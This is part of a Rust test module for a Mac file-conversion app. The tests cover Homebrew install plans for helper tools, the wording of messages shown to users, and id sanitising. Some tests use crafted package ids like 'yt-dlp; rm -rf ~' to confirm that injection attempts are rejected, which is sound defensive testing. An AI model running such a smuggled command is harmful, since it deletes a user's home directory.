            line.split_once(": ").map(|(head, _)| head).unwrap_or(line)
        }

        let plans = install_plans_with(Some(&HOMEBREW), true);
        for package in ALL_PACKAGES.iter().copied() {
            let plan = plan_for(&plans, package.id);

            // No two lines about the same thing: "Save documents: TXT" plus "Save documents: HTML"
            // is exactly what stacking the members produced.
            let mut subjects: Vec<&str> = plan.unlocks.iter().map(|l| subject(l)).collect();
            let before = subjects.len();
            subjects.sort_unstable();
            subjects.dedup();
            assert_eq!(subjects.len(), before, "{}: {:?}", package.id, plan.unlocks);

            // ...and no format named twice inside a line. Reading and writing are different facts,
            // so a format may legitimately appear in both "Open images" and "Save images".
            for line in &plan.unlocks {
                let mut names = names_listed(line);
                let before = names.len();
                names.sort_unstable();
                names.dedup();
                assert_eq!(names.len(), before, "{}: `{line}`", package.id);
            }
        }

        // Poppler, the case that started this: three binaries, one PDF, named once.
        let poppler = plan_for(&plans, "poppler");
        let listed: Vec<&str> = poppler.unlocks.iter().flat_map(|l| names_listed(l)).collect();
        assert_eq!(listed.iter().filter(|n| **n == "PDF").count(), 1, "{:?}", poppler.unlocks);

        // The alternative this is guarding against, spelled out: Poppler's three members stacked
        // repeat themselves, and the package's own sentences do not.
        let stacked: Vec<String> = POPPLER.tools.iter().copied().flat_map(unlocks).collect();
        let mut deduped = stacked.clone();
        deduped.sort();
        deduped.dedup();
        assert!(
            deduped.len() < stacked.len(),
            "stacking three finished lists must repeat itself: {stacked:?}"
        );
    }

    /// The bundled engine and the `sips` every Mac ships are not installs, and a settings page that
    /// offered them would be offering nothing. They must not reach the list at all - not as a row
    /// with a dead button, not as a member of somebody else's package.
    #[test]
    fn nothing_bundled_or_built_in_is_ever_installable() {
        let plans = install_plans_with(Some(&HOMEBREW), true);
        let offered: Vec<&str> = plans.iter().map(|p| p.package_id.as_str()).collect();
        assert_eq!(
            offered,
            ["libreoffice", "pandoc", "imagemagick", "poppler", "ruffle", "yt-dlp", "deno"]
        );

        for tool in ALL_TOOLS.iter().copied().filter(|t| t.is_bundled() || *t == Tool::Sips) {
            assert!(tool.package().is_none(), "{} belongs to no package", tool.id());
            assert!(!is_installable(tool), "{} is not an install", tool.id());
            assert!(
                !plans.iter().any(|p| p.tool_ids.iter().any(|id| id == tool.id())),
                "{} is promised by a package plan",
                tool.id()
            );
            let err = resolve_install_with(tool.id(), Some(&HOMEBREW), Some(fake_brew()))
                .expect_err("there is nothing to install");
            assert!(err.contains("nothing to install"), "{err}");
        }
    }

    /// The sixth package, and the only one whose offer is not derived from the format table: it
    /// unlocks a *source*. Everything else about it goes through the same model - one id, one
    /// hardcoded `brew install`, one row that joins onto the tool statuses.
    #[test]
    fn yt_dlp_is_an_ordinary_package_that_unlocks_links_rather_than_formats() {
        let plans = install_plans_with(Some(&HOMEBREW), true);
        let plan = plan_for(&plans, "yt-dlp");
        assert_eq!(plan.name, "yt-dlp");
        assert_eq!(plan.tool_ids, ["yt-dlp"]);
        assert_eq!(plan.command, "brew install yt-dlp");
        assert!(!plan.needs_admin, "a formula needs no password");
        assert!(plan.can_auto_install);
        assert_eq!(
            plan.unlocks.len(),
            1,
            "one sentence about links, no format lists: {:?}",
            plan.unlocks
        );
        assert!(plan.unlocks[0].contains("YouTube") && plan.unlocks[0].contains("Bilibili"));
        assert!(plan.unlocks[0].contains("20"), "the cap is part of the promise");
        assert!(unlocked_formats(Tool::YtDlp).is_empty(), "it converts nothing");

        // The install path is the existing one, id-keyed and nothing else.
        let resolved = resolve_install_with("yt-dlp", Some(&HOMEBREW), Some(fake_brew()))
            .expect("yt-dlp is installable");
        assert_eq!(resolved.args, ["install", "yt-dlp"]);
        assert_eq!(resolved.program, fake_brew());
        for crafted in ["yt-dlp; rm -rf ~", "ytdlp", "youtube-dl", "yt-dlp "] {
            assert!(Package::by_id(crafted).is_none(), "`{crafted}` must not resolve");
        }
    }

    /// The seventh package, and the runtime the sixth one needs: a fetch without it is the
    /// "Sign in to confirm you're not a bot" the user reported. One click, one formula, one row -
    /// and the hint has to be the command, or the settings page is telling somebody to type
    /// something we would never run.
    #[test]
    fn deno_is_one_click_installable_next_to_yt_dlp() {
        let plans = install_plans_with(Some(&HOMEBREW), true);
        let plan = plan_for(&plans, "deno");
        assert_eq!(plan.name, "Deno");
        assert_eq!(plan.tool_ids, ["deno"]);
        assert_eq!(plan.command, "brew install deno");
        assert_eq!(Tool::Deno.install_hint(), "brew install deno");
        assert!(!plan.needs_admin, "a formula needs no password");
        assert!(plan.can_auto_install);
        assert!(is_installable(Tool::Deno));
        assert_eq!(
            plan.unlocks.len(),
            1,
            "one sentence about links, no format lists: {:?}",
            plan.unlocks
        );
        assert!(plan.unlocks[0].contains("YouTube"), "{:?}", plan.unlocks);
        assert!(unlocked_formats(Tool::Deno).is_empty(), "it converts nothing");

        let resolved = resolve_install_with("deno", Some(&HOMEBREW), Some(fake_brew()))
            .expect("deno is installable");
        assert_eq!(resolved.args, ["install", "deno"]);
        assert_eq!(resolved.program, fake_brew());

        // Node is a runtime we *use*, never one we install: no row, no button, and a hint that is
        // not a command we would run.
        assert!(Tool::Node.package().is_none(), "nothing installs Node for the user");
        assert!(!is_installable(Tool::Node));
        assert!(!plans.iter().any(|p| p.tool_ids.iter().any(|id| id == "node")));
        for crafted in ["deno ", "Deno", "node", "deno; rm -rf ~"] {
            assert!(Package::by_id(crafted).is_none(), "`{crafted}` must not resolve");
        }
    }

    #[test]
    fn without_homebrew_no_plan_offers_a_button() {
        for plan in install_plans_with(Some(&HOMEBREW), false) {
            assert!(!plan.can_auto_install, "{} must not offer a button", plan.package_id);
            assert!(!plan.manager_available, "{}", plan.package_id);
        }
        // ...but the command is still there, so the UI can tell the user what to run.
        let plans = install_plans_with(Some(&HOMEBREW), false);
        assert_eq!(plan_for(&plans, "pandoc").command, "brew install pandoc");

        for plan in install_plans_with(None, false) {
            assert_eq!(plan.manager, NO_MANAGER, "{}", plan.package_id);
            assert!(plan.command.is_empty(), "{}", plan.package_id);
        }
    }

    /// The awkward middle, from the install side: `pdftoppm` arrived, the other two did not. Such a
    /// package is *not installed* - the route that needs `pdftohtml` cannot run - and it is still
    /// installable, because one more `brew install poppler` is exactly the fix. A settings page that
    /// ticked it off would strand the user with no button and a conversion that keeps failing.
    #[test]
    fn a_partial_package_is_still_offered_and_never_ticked_off() {
        let mut registry = ToolRegistry::default();
        registry.set(Tool::PdfToPpm, PathBuf::from("/opt/homebrew/bin/pdftoppm"));
        assert_eq!(POPPLER.presence(&registry), Presence::Partial);
        assert!(!POPPLER.is_installed(&registry));
        assert!(package_is_installable(&POPPLER), "a half-installed package is the fix's target");

        let plans = install_plans_with(Some(&HOMEBREW), true);
        let plan = plan_for(&plans, "poppler");
        assert!(plan.can_auto_install, "the Install button has to stay live");
        assert_eq!(plan.command, "brew install poppler");
        // The UI derives "incomplete" by joining these ids against the tool statuses, so all three
        // have to be there whatever the machine happens to have.
        assert_eq!(plan.tool_ids, ["pdftoppm", "pdftotext", "pdftohtml"]);
        assert_eq!(
            plan.tool_ids
                .iter()
                .filter(|id| !registry.has(tool_by_id(id).expect("member")))
                .count(),
            2,
            "two of Poppler's three binaries are missing on this machine"
        );
    }

    #[test]
    fn unlocks_are_derived_from_the_catalog() {
        // Every format that names a tool must be reachable from that tool's own list. The two
        // exceptions the rule has to state out loud both belong to the link feature: yt-dlp
        // converts nothing, it *fetches*, and a JavaScript runtime is what lets it - so no catalog
        // entry names either of them, and their sentences are about links rather than formats.
        let fetching = |t: Tool| t == Tool::YtDlp || t.js_runtime_name().is_some();
        for tool in ALL_TOOLS.iter().copied().filter(|t| !t.is_bundled() && !fetching(*t)) {
            let formats = unlocked_formats(tool);
            assert!(!formats.is_empty(), "{} unlocks nothing at all", tool.id());
            for f in &formats {
                assert!(
                    f.read.helpers().contains(&tool) || f.write.helpers().contains(&tool),
                    "{} does not declare {}",
                    f.id,
                    tool.id()
                );
            }
            assert!(!unlocks(tool).is_empty(), "{} has nothing to say", tool.id());
        }

        // The owner's actual case: documents need LibreOffice, and only LibreOffice writes PDF.
        let office = unlocked_formats(Tool::LibreOffice);
        for id in ["pdf", "docx", "xlsx", "pptx", "csv", "odt"] {
            assert!(office.iter().any(|f| f.id == id), "LibreOffice must unlock {id}");
        }
        assert!(!office.iter().any(|f| f.id == "epub"), "EPUB is Pandoc's job");
        assert_eq!(
            crate::by_id("pdf").expect("pdf").write.helpers(),
            &[Tool::LibreOffice],
            "if another tool learns to write PDF, the wording below has to be revisited"
        );

        let pandoc = unlocks(Tool::Pandoc);
        assert!(
            pandoc.iter().any(|s| s.contains("EPUB ebook") && s.contains("LaTeX")),
            "{pandoc:?}"
        );
        let magick = unlocks(Tool::Magick);
        assert!(magick.iter().any(|s| s.contains("SVG (vector)")), "{magick:?}");
        // ImageMagick overlaps with the `sips` every Mac already has - say so.
        assert!(
            magick.iter().any(|s| s.contains("also work with") && s.contains("sips")),
            "{magick:?}"
        );

        let bundled = unlocks(Tool::Ffmpeg);
        assert_eq!(bundled.len(), 1);
        assert!(
            bundled[0].starts_with("Already included") && bundled[0].contains("video files"),
            "{bundled:?}"
        );
    }

    /// The settings page is read by somebody who just wants a PDF, so the strings must be prose -
    /// not catalog ids like `json_doc`, and not an unbounded wall of 16 format names.
    #[test]
    fn unlocks_read_like_english() {
        let sets: Vec<Vec<Tool>> = ALL_TOOLS
            .iter()
            .map(|t| vec![*t])
            .chain(ALL_PACKAGES.iter().map(|p| p.tools.to_vec()))
            .collect();
        for tools in &sets {
            for line in unlocks_for(tools) {
                assert!(!line.contains('_'), "{tools:?}: `{line}` leaks a catalog id");
                assert!(line.len() < 200, "{tools:?}: `{line}` is too long to read");
                assert!(
                    line.chars().next().is_some_and(|c| c.is_uppercase()),
                    "{tools:?}: `{line}` does not start like a sentence"
                );
            }
        }
        // LibreOffice covers far more document formats than fit in one line.
        let documents = unlocks(Tool::LibreOffice)
            .into_iter()
            .find(|l| l.contains("documents"))
            .expect("a document line");
        assert!(documents.contains("Word (docx)") && documents.contains("more"), "{documents}");
    }

    /// The reason the two names exist. A person reads a package name; only a log, a `--version`
    /// probe and `FORMATS.md` may name the executable, because that is where knowing which of
    /// Poppler's three binaries is missing is the useful thing.
    ///
    /// Every string this crate hands a user is checked, which is why the assertion is a *substring*
    /// of the binaries rather than a list of them: a fourth `pdfto…` tool is covered the day it is
    /// added.
    #[test]
    fn nothing_a_user_reads_names_a_binary() {
        let mut read_by_a_person: Vec<String> = Vec::new();

        for plan in install_plans_with(Some(&HOMEBREW), true) {
            read_by_a_person.push(plan.name.clone());
            read_by_a_person.push(plan.command.clone());
            read_by_a_person.extend(plan.unlocks.clone());
            // `tool_ids` is deliberately absent: those are the keys the UI joins on, never shown.
        }
        for package in ALL_PACKAGES.iter().copied() {
            read_by_a_person.push(install_hint(package).to_string());
            // Every refusal `resolve_install` can produce for a package a user asked to install.
            for (manager, path) in
                [(Some(&HOMEBREW), Some(fake_brew())), (Some(&HOMEBREW), None), (None, None)]
            {
                if let Err(refusal) = resolve_install_with(package.id, manager, path) {
                    read_by_a_person.push(refusal);
                }
            }
        }
        for tool in ALL_TOOLS.iter().copied() {
            read_by_a_person.push(tool.user_facing_name().to_string());
            read_by_a_person.extend(unlocks(tool));
            if let Err(refusal) =
                resolve_install_with(tool.id(), Some(&HOMEBREW), Some(fake_brew()))
            {
                // The id the caller sent is echoed by `printable` in one branch only (an id that is
                // no helper at all); a *member* id is answered with its package's name instead.
                read_by_a_person.push(refusal);
            }
        }
        // What the pickers say about a format that needs a helper ("PDF - needs LibreOffice or
        // Poppler or …"), on a machine with nothing installed.
        for category in crate::catalog_view(&ToolRegistry::default()).categories {
            for format in category.inputs.iter().chain(category.outputs.iter()) {
                read_by_a_person.extend(format.needs.iter().map(|n| (*n).to_string()));
            }
        }

        for line in &read_by_a_person {
            assert!(!line.contains("pdfto"), "`{line}` names a binary to a user");
        }
        // ...and the guard is not passing because the list is empty or full of ids.
        assert!(read_by_a_person.len() > 40, "{read_by_a_person:#?}");
        assert!(
            read_by_a_person.iter().any(|l| l.contains("Poppler")),
            "Poppler must be named as itself somewhere: {read_by_a_person:#?}"
        );
    }

    #[test]
    fn lists_are_joined_the_way_a_person_would_write_them() {
        assert_eq!(join(&[], "and"), "");
        assert_eq!(join(&["one"], "and"), "one");
        assert_eq!(join(&["one", "two"], "and"), "one and two");
        assert_eq!(join(&["one", "two", "three"], "or"), "one, two or three");
    }

    #[test]
    fn an_echoed_id_can_never_carry_control_characters() {
        assert_eq!(printable("libre\noffice"), "libreoffice");
        assert_eq!(printable("\u{1b}[31mred"), "[31mred");
        assert_eq!(printable("`id`"), "'id'");
        assert_eq!(printable(""), "(empty)");
        assert_eq!(printable(&"x".repeat(200)).len(), 40);
    }
}
